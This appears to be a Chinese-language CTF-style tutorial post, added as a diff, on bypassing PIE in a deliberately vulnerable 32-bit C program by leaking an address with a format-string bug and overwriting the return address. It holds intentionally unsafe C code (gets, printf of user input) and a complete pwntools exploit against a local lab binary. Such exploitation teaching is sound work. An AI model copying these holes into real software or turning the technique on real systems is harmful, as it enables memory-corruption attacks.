@@ -1,0 +1,177 @@
+---
+title: '通过格式化字符串绕过 PIE'
+date: '2023-08-22'
+lastmod: '2023-08-22'
+tags: ['PWN', 'Stack']
+draft: false
+summary: '无已知地址绕过 PIE'
+authors: ['default']
+---
+
+## 0x01 源码
+
+LINK
+
+```c:source.c
+#include <stdio.h>
+
+void vuln() {
+  char buffer[20];
+
+  printf("What's your name?\n");
+  gets(buffer);
+  
+  printf("Nice to meet you ");
+  printf(buffer);
+  printf("\n");
+
+  puts("What's your message?");
+
+  gets(buffer);
+}
+
+int main() {
+  vuln();
+
+  return 0;
+}
+
+void win() {
+  puts("PIE bypassed! Great job :D");
+}
+```
+
+与上篇文章不同的是，这次我们没有得到任何一个函数的绝对地址。我们必须使用其它
+手段来泄漏它。
+
+## 0x02 分析
+
+```
+$ ./vuln-32
+What's your name?
+%p
+Nice to meet you 0xf7f3e000
+What's your message?
+hello
+```
+
+测试发现可以使用格式化字符串来泄漏地址。
+
+## 0x03 利用
+
+### 1x01 基础信息
+
+和上次一样，我们首先设置好一些基本内容。
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+elf = context.binary = ELF('./vuln-32')
+p = process()
+```
+
+### 1x02 泄漏 PIE
+
+现在我们只需要泄漏地址就好了。我们可以在 `pwndbg` 里面尝试一些不同的偏移量来测试。
+
+```
+$ pwndbg vuln-32
+What's your name?
+%p %p %p %p %p
+Nice to meet you 0xf7fc6000 (nil) 0x565561d5 (nil) (nil)
+What's your message?
+hello
+```
+
+第 3 个看起来像一个函数的地址，让我们检查一下第 3 个泄漏值和基地址之间的差异。
+在格式化字符串泄漏的值之后的某个位置设置一个断点（在哪里并不重要）。
+
+你也可以直接把断点下在泄漏的这个值上面，设这个断点只是为了能够让我们调试程序。
+
+```
+$ pwndbg vuln-32
+$ r
+What's your name?
+%3$p
+Nice to meet you 0x565561d5
+[...]
+$ b *0x565561d5
+Breakpoint 1 at 0x565561d5
+$ r
+[...]
+$ vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+     Start        End Perm     Size Offset File
+0x56555000 0x56556000 r--p     1000      0 vuln-32
+0x56556000 0x56557000 r-xp     1000   1000 vuln-32
+[...]
+```
+
+我们可以看到基地址是 `0x56555000` ，泄漏的值是 `0x565561d5` 。因此，从泄漏的
+地址中减去 `0x11d5` 就会得到二进制文件的基地址。
+
+:::tip
+可以通过 `vmmap` 指令来查看程序运行的基地址。
+
+对于没有开启 PIE 的程序，直接用 `checksec` 也可以看到基地址。
+:::
+
+```python
+p.recvuntil('name?\n')
+p.sendline('%3$p')
+
+p.recvuntil('you ')
+elf_leak = int(p.recvline(), 16)
+
+elf.address = elf_leak - 0x11d5
+log.success(f'PIE base: {hex(elf.address)}')
+```
+
+现在，我们只需要发送 payload 就可以了。
+
+```python
+payload = b'A' * 32
+payload += p32(elf.sym['win'])
+
+p.recvuntil('message?\n')
+p.sendline(payload)
+
+p.interactive()
+```
+
+### 1x03 最终 Exploit
+
+```python:exp.py
+from pwn import *
+
+context.log_level = 'debug'
+
+elf = context.binary = ELF('./vuln-32')
+p = process()
+
+p.recvuntil('name?\n')
+p.sendline('%3$p')
+
+p.recvuntil('you ')
+elf_leak = int(p.recvline(), 16)
+
+elf.address = elf_leak - 0x11d5
+log.success(f'PIE base: {hex(elf.address)}')
+
+payload = b'A' * 32
+payload += p32(elf.sym['win'])
+
+p.recvuntil('message?\n')
+p.sendline(payload)
+
+p.interactive()
+```
+
+## 0x04 64-bit
+
+同样的思路，只是 64-bit。试试看 :)
+
+LINK
+
